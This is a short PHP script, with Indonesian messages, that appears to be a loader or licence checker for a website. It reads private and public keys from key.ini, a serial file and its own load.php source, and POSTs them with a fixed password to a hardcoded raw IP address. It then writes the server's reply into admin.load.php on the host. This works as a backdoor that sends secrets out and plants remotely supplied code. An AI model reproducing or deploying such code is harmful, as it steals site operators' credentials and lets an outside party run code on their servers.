<?php
function checkcurl(){
    return function_exists('curl_version');
}
$check = checkcurl();
if($check == "0") {
    echo "Curl belum terinstall, mohon install php curl terlebih dahulu.";
    exit();
}

function load($domain,$path) {
	$get = curl_init();
	$config = parse_ini_file('key.ini');
	$serials = parse_ini_file('.serial');
	$serial = $serials['id'];
    $key = $config['private_key'];
    $publickey = $config['public_key'];
    $getfile = booya();
	curl_setopt($get, CURLOPT_URL,"http://144.217.104.56/api/server_jos.php");
	curl_setopt($get, CURLOPT_POST, 1);
	curl_setopt($get, CURLOPT_POSTFIELDS, "password=neo&key=$key&domain=$domain&path=$path&serial=$serial&public=$publickey&file=$getfile");
	curl_setopt($get, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($get);
	curl_close($get);

	die(
		'<textarea cols=24 rows=30>'.$server_output.'</textarea>'
	);
}

function booya(){
	$click = "load.php";
	$file = fopen($click, "r");
	$check = fread($file, filesize($click));
	fclose($file);
	return urlencode($check);
}

function admin($domain,$path) {
	$getfile = booya();
	$get = curl_init();
	curl_setopt($get, CURLOPT_URL,"http://144.217.104.56/api/admin.php");
	curl_setopt($get, CURLOPT_POST, 1);
	curl_setopt($get, CURLOPT_POSTFIELDS, "password=neo&domain=$domain&path=$path&file=$getfile");
	curl_setopt($get, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($get);
	curl_close($get);
	return $server_output;
}
function welcome($val) {
    file_put_contents('admin.load.php', $val);
}
function valid_file($path){
	$config = parse_ini_file('key.ini');
    $key = $config['private_key'];
    $domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
    welcome(load($domain,$path));
}
function load_admin($path){
	$config = parse_ini_file('key.ini');
    $key = $config['private_key'];
    $domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
    welcome(admin($domain,$path));
}
?>
